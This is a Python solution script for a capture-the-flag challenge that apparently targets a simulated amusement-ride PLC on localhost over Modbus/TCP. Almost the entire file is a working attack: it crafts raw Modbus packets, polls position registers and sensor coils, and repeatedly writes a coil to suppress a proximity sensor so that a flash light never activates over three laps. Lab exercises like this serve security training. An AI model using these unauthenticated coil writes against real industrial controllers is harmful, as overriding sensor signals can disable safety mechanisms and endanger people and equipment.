#!/usr/bin/env python3
"""
CTF Challenge 10: Full Laps Silent (Hard - 300 points)
Complete 3 full laps without the flash light activating once

Method: Advanced sustained suppression with position tracking
This is similar to Stealth Mode but requires perfect execution
"""

import socket
import struct
import time
from datetime import datetime

PLC_HOST = 'localhost'
PLC_PORT = 502

def build_write_coil(transaction_id, address, value):
    """Build a Modbus Write Single Coil request"""
    protocol_id = 0
    data_length = 6
    unit_id = 1
    function_code = 5

    value_bytes = 0xFF00 if value else 0x0000

    return struct.pack('>HHHBBHH',
        transaction_id,
        protocol_id,
        data_length,
        unit_id,
        function_code,
        address,
        value_bytes
    )

def build_read_coils(transaction_id, address, quantity):
    """Build a Modbus Read Coils request"""
    protocol_id = 0
    data_length = 6
    unit_id = 1
    function_code = 1

    return struct.pack('>HHHBBHH',
        transaction_id,
        protocol_id,
        data_length,
        unit_id,
        function_code,
        address,
        quantity
    )

def build_read_register(transaction_id, address, quantity):
    """Build a Modbus Read Holding Registers request"""
    protocol_id = 0
    data_length = 6
    unit_id = 1
    function_code = 3

    return struct.pack('>HHHBBHH',
        transaction_id,
        protocol_id,
        data_length,
        unit_id,
        function_code,
        address,
        quantity
    )

def parse_read_coils_response(response):
    """Parse a Read Coils response"""
    if len(response) < 9:
        return None

    byte_count = response[8]
    coil_bytes = response[9:9+byte_count]

    coils = []
    for byte_val in coil_bytes:
        for bit in range(8):
            coils.append(bool(byte_val & (1 << bit)))

    return coils

def parse_read_registers_response(response):
    """Parse a Read Holding Registers response"""
    if len(response) < 9:
        return None

    byte_count = response[8]
    num_registers = byte_count // 2

    registers = []
    for i in range(num_registers):
        offset = 9 + (i * 2)
        reg_value = struct.unpack('>H', response[offset:offset+2])[0]
        registers.append(reg_value)

    return registers

def main():
    print("="*60)
    print("CTF Challenge 10: Full Laps Silent")
    print("="*60)
    print()
    print("Objective: Complete 3 perfect laps with ZERO flash activations")
    print("Method: Precision suppression with aggressive monitoring")
    print()
    print("⚠️  This is the HARDEST challenge - requires perfect execution")
    print("    Start the ride before running this script")
    print()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.connect((PLC_HOST, PLC_PORT))
        print(f"✓ Connected to PLC at {PLC_HOST}:{PLC_PORT}")
    except Exception as e:
        print(f"❌ Failed to connect: {e}")
        return

    transaction_id = 1
    last_position = 0
    lap_count = 0
    suppression_count = 0
    flash_detected = False
    start_time = time.time()
    position_history = []

    print("\n[Attack Phase] Ultra-aggressive signal suppression...")
    print("Target: 3 perfect laps")
    print("Tolerance: ZERO flash activations")
    print("Strategy: Predictive suppression + reactive monitoring")
    print()
    print("Press Ctrl+C to stop\n")

    try:
        while lap_count < 3 and not flash_detected:
            # Read current position with high priority
            request = build_read_register(transaction_id, 1, 1)
            sock.send(request)
            response = sock.recv(1024)
            registers = parse_read_registers_response(response)

            current_position = 0
            if registers:
                current_position = registers[0]
                position_history.append(current_position)

            # Detect lap completion
            if current_position < last_position and last_position > 0:
                lap_count += 1
                elapsed = time.time() - start_time
                avg_time = elapsed / lap_count
                print(f"[LAP {lap_count}/3] Time: {elapsed:.1f}s | Avg: {avg_time:.1f}s/lap | Suppressions: {suppression_count}")

            last_position = current_position
            transaction_id += 1

            # AGGRESSIVE: Read coils twice per cycle for redundancy
            for _ in range(2):
                request = build_read_coils(transaction_id, 0, 4)
                sock.send(request)
                response = sock.recv(1024)
                coils = parse_read_coils_response(response)

                if coils:
                    proximity_sensor = coils[0]
                    flash_light = coils[3]

                    # CRITICAL: If flash activated, mission failed
                    if flash_light:
                        flash_detected = True
                        print(f"\n❌ FLASH DETECTED at position {current_position}!")
                        print("   Challenge FAILED - flash light activated")
                        break

                    # PREDICTIVE: Suppress proximity if position near event zone
                    # Event position is typically 5, suppress in range 4-6
                    if current_position >= 4 and current_position <= 6:
                        if proximity_sensor:
                            transaction_id += 1
                            suppress_request = build_write_coil(transaction_id, 0, False)
                            sock.send(suppress_request)
                            sock.recv(1024)
                            suppression_count += 1
                            print(f"[SUPPRESS] Pos {current_position} | Total: {suppression_count}")

                    # REACTIVE: Also suppress any unexpected proximity triggers
                    elif proximity_sensor:
                        transaction_id += 1
                        suppress_request = build_write_coil(transaction_id, 0, False)
                        sock.send(suppress_request)
                        sock.recv(1024)
                        suppression_count += 1
                        print(f"[SUPPRESS] Unexpected at pos {current_position} | Total: {suppression_count}")

                transaction_id += 1

            # Ultra-fast polling - minimize window for flash activation
            time.sleep(0.05)

        if lap_count >= 3 and not flash_detected:
            elapsed = time.time() - start_time
            print(f"\n{'='*60}")
            print("🎯🎯🎯 PERFECT! Full Laps Silent COMPLETED! 🎯🎯🎯")
            print(f"{'='*60}")
            print(f"  Total Time: {elapsed:.1f}s")
            print(f"  Average per lap: {elapsed/3:.1f}s")
            print(f"  Proximity suppressions: {suppression_count}")
            print(f"  Flash activations: 0 ✓✓✓")
            print(f"  Position samples: {len(position_history)}")
            print(f"{'='*60}")
            print("\n  This was the hardest challenge - congratulations!")
        elif flash_detected:
            elapsed = time.time() - start_time
            print(f"\n{'='*60}")
            print("❌ Challenge FAILED")
            print(f"{'='*60}")
            print(f"  Laps completed: {lap_count}/3")
            print(f"  Time: {elapsed:.1f}s")
            print(f"  Suppressions: {suppression_count}")
            print(f"  Flash detected: YES ❌")
            print("\n  Retry with more aggressive suppression")

    except KeyboardInterrupt:
        elapsed = time.time() - start_time
        print(f"\n\n[Attack Interrupted]")
        print(f"  Laps: {lap_count}/3")
        print(f"  Time: {elapsed:.1f}s")
        print(f"  Suppressions: {suppression_count}")
        print(f"  Flash detected: {'YES ❌' if flash_detected else 'NO ✓'}")

        if lap_count >= 3 and not flash_detected:
            print("\n🎯 Success! Check dashboard for completion")
    finally:
        sock.close()

if __name__ == '__main__':
    main()
